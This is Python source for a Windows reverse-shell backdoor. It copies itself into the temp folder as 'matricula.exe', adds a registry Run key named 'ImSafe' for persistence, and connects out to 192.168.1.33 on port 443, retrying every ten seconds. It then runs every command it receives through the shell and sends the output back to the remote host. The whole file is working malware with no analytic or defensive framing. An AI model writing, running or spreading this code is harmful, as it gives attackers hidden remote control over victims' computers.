import time
import socket
import subprocess
import tempfile
import os

ibe = '192.168.1.33'
pora = 443
nomeqqro = 'matricula.exe'
aqueleladotempo = tempfile.gettempdir()
diretorinho = os.path.dirname(os.path.abspath(__file__))

def esegredo():
	os.system("copy " + nomeqqro + " " + aqueleladotempo)
	print("copiando " + nomeqqro + " " + aqueleladotempo)
	FNULL = open(os.devnull, 'w')
	subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
					" /v ImSafe /d " + aqueleladotempo + "\\" + nomeqqro, stdout=FNULL, stderr=FNULL)

def conectar(ibe, pora):
	try:
		j = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		j.connect((ibe, pora))
		j.send(b'[!] Conexao recebiba\n')
		return j

	except Exception as e:
		print('erro de conexao', e)
		errinhobobo(j)
		return None


def escuchando(j):
	try:
		while True:
			mandei = j.recv(1024)
			if mandei[:-1] == b'/exit':
				j.close()
				exit(0)
			elif mandei[:-1] == b'/cd':
				mandei = j.recv(1024)
				if mandei[:-1] == b'..':
					os.chdir("..")
					escuchando(j)
				else:
					os.chdir(mandei[:-1])
					escuchando(j)
			else:
				cumando(j, mandei[:-1])

	except Exception as e:
		#error(s)
		return None

def cumando(j, mandei):
	cular = subprocess.Popen([mandei], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	j.send(cular.stdout.read() + cular.stderr.read())

def errinhobobo(j):
	if j:
		j.close()
	main()

def main():
	while True:
		se_conectado = conectar(ibe, pora)
		if se_conectado:
			escuchando(se_conectado)
		else:
			print('conexao deu erro, tentando novamente')
			time.sleep(10)

if diretorinho.lower() != aqueleladotempo.lower():
	esegredo()
main()
